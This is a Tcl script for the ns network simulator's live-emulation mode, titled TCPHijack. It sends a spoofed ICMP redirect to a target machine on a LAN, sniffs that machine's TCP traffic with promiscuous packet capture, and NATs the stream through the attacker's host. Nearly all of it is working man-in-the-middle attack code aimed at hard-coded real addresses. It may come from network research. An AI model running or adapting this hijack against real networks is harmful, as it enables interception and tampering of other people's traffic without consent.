#
# TCPHijack -- the idea of this script is to sit on a LAN and
# send an icmp redirect to our "target" machine.  The target is
# then lead into believing we (the emulating host) are the correct
# router for the destination.
# By performing NAT on the TCP stream, we cause the TCP traffic to
# pass through us on the way to the destination.
# We need a bogus [unused] IP address on the subnet for this.
#

set targetip 131.243.1.89; # coot
set dummyip 131.243.1.86; # bit
set gwip 131.243.1.1; # ir40gw
set dstip 128.32.33.5; # vangogh.cs.berkeley.edu

Class TCPHijack
TCPHijack instproc config ns {
	$self instvar ns_
	set ns_ $ns

	$self maketopo
	$self makeicmp
	$self makeip
	$self makepcap
	$self maketcpnat
	$self makeconnections
}

TCPHijack instproc maketopo {} {
	$self instvar ns_ node_
	set node_(icmp) [$ns_ node]
	set node_(ip) [$ns_ node]
	set node_(nat) [$ns_ node]
	set node_(pcap) [$ns_ node]

	$ns_ simplex-link $node_(icmp) $node_(ip) 10Mb 0.002ms DropTail
	$ns_ simplex-link $node_(nat) $node_(ip) 10Mb 0.002ms DropTail
	$ns_ simplex-link $node_(pcap) $node_(nat) 10Mb 0.002ms DropTail
}

TCPHijack instproc makeicmp {} {
	$self instvar node_ agent_ ns_

	set agent_(icmp) [new Agent/IcmpAgent]
	$ns_ attach-agent $node_(icmp) $agent_(icmp)
	return $agent_(icmp)
}

TCPHijack instproc makepcap {} {
	global targetip dstip dummyip
	$self instvar node_ agent_ ns_

	# pcap for snarfing outbound tcp packets
	# (pkts sent from target to destination)
	set livenet [new Network/Pcap/Live]
	$livenet set promisc_ true
	$livenet open readonly
	$livenet filter "tcp and src $targetip and dst $dstip"
	set agent_(pcapforw) [new Agent/Tap]
	$agent_(pcapforw) network $livenet

	# pcap for snarfing inbound tcp packet
	# (pkts received from destination to dummy)
	set livenet [new Network/Pcap/Live]
	$livenet set promisc_ true
	$livenet open readonly
	$livenet filter "tcp and src $dstip and dst $dummyip"
	set agent_(pcapback) [new Agent/Tap]
	$agent_(pcapback) network $livenet

	$ns_ attach-agent $node_(pcap) $agent_(pcapforw)
	$ns_ attach-agent $node_(pcap) $agent_(pcapback)
}

TCPHijack instproc makeip {} {
	$self instvar node_ agent_ ns_

	set livenet [new Network/IP]
	$livenet open writeonly

	set agent_(ip) [new Agent/Tap]
	$agent_(ip) network $livenet
	$ns_ attach-agent $node_(ip) $agent_(ip)
}

TCPHijack instproc makeconnections {} {
	$self instvar node_ agent_ ns_

	$ns_ simplex-connect $agent_(icmp) $agent_(ip)
	$ns_ simplex-connect $agent_(snat) $agent_(ip)
	$ns_ simplex-connect $agent_(dnat) $agent_(ip)
	$ns_ simplex-connect $agent_(pcapforw) $agent_(snat)
	$ns_ simplex-connect $agent_(pcapback) $agent_(dnat)
}

TCPHijack instproc maketcpnat {} {
	global dummyip targetip
	$self instvar node_ agent_ ns_

	set agent_(snat) [new Agent/NatAgent/TCPSrc]
	$agent_(snat) source $dummyip

	set agent_(dnat) [new Agent/NatAgent/TCPDest]
	$agent_(dnat) destination $targetip

	$ns_ attach-agent $node_(nat) $agent_(snat)
	$ns_ attach-agent $node_(nat) $agent_(dnat)
}

TCPHijack instproc sendredirect {} {
	global gwip targetip dstip dummyip
	$self instvar agent_
	$agent_(icmp) send redirect $gwip $targetip $dstip $dummyip
}

TCPHijack thobj
set th "thobj"

set ns [new Simulator]
$ns use-scheduler RealTime
$th config $ns
$ns at 0.0 "$th sendredirect"
$ns run
